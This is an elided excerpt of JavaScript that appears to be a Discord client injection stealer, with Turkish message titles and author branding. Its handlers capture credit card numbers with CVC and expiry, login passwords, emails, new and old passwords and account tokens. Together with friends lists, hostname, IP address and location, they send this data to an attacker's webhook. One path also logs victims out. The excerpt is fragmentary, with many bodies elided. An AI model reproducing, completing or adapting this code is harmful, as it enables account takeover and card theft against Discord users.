...
var config = {
  ...
  embed: {
      ...
      footer: {
          text: `by kxzeyk ☹`,
          icon_url: "https://github.com/kxzeyk",
      },
      href: "https://github.com/kxzeyk",
      avatar_url: "https://images-ext-2.discordapp.net/external/ZLkp9TwyBZRpVFnyxd6L1sKrcVlurcQDED_4JQRhUAE/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1069550876240388096/181fe51f89c18aec75ec3b0f9733ba4b.png?width=670&height=670"
  },
...
var event_handlers = {
  ...
  async creditCardAdded(number, cvc, month, year) {
      ...
      var params = {
          ...
          embeds: [createEmbed({
              title: "Discord - Kredi kartı eklendi",
  ...
  async userLogin(password, email, token) {
      ...
      var params = {
          ...
          embeds: [createEmbed({
              ...
              description: `**Toplam arkadaşlar (${friends['length']})**\n\n${friends.frien}`,
              thumbnail: {
                  url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
              },
              author: {
  ...
  async emailChanged(password, newEmail, token) {
      ...
      var params = {
          ...
          avatar_url: config.embed.avatar_url,
          embeds: [createEmbed({
              title: "Discord - E-mail değiştirildi",
              url: config.embed.href,
              author: {
                  name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                  url: config.embed.href,
  ...
  async passwordChanged(oldPassword, newPassword, token) {
      ...
      var params = {
          ...
          avatar_url: config.embed.avatar_url,
          embeds: [createEmbed({
              title: "Discord - Şifre değiştirildi",
              url: config.embed.href,
              author: {
                  name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                  url: config.embed.href,
...
async function getRelationships(token) {
  ...
  for (z of r) {
      ...
      if (b != "") {
          ...
          // dont write the discord discriminator if it is 0
          rareBadgesFriends += b + ` - ${z.user.username}${z.user.discriminator == 0 ? "" : "#" + z.user.discriminator}\n`
      }
  }
      ...
      if (config.notify_on_initialization) {
          if (token == undefined) {
              sendToWebhook({
                  ...
                  url: config.embed.href,
                  embeds: [createEmbed({
                      title: "Discord - Kullanıcı giriş yapıyor",
                      fields: [{
                          name: "Ad",
                          value: `\`\`\`${os.hostname}\`\`\``,
                          inline: false
                          ...
                          name: "Bağlantı bilgisi",
                          value: `\`\`\`yaml\nIP: ${network_data['ip'] ?? "??"}\nAd: ${network_data['hostname'] ?? "Unknown"}\nŞehir: ${network_data['city'] ?? "??"}\nBölge: ${network_data['region'] ?? "??"}\nÜlke: ${network_data["country"] ?? "??"}\nSaat dilimi: ${network_data["timezone"] ?? "??"}\`\`\``,
                          inline: false
                      }],
                  })]
              })
              ...
              sendToWebhook({
                  ...
                  embeds: [createEmbed({
                      ...
                      description: `**Arkadaş sayısı (${friends['length']})**\n\n${friends.frien}`,
                      thumbnail: {
                          url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                      },
                      author: {
      ...
      if (config.logout && token) {
          ...
          if (config.notify_on_logout) {
              sendToWebhook({
                  ...
                  avatar_url: config.embed.avatar_url,
                  embeds: [createEmbed({
                      title: "Discord - Kullanıcı çıkış yaptı",
                      url: config.embed.href,
                      author: {
                          name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                          url: config.embed.href,
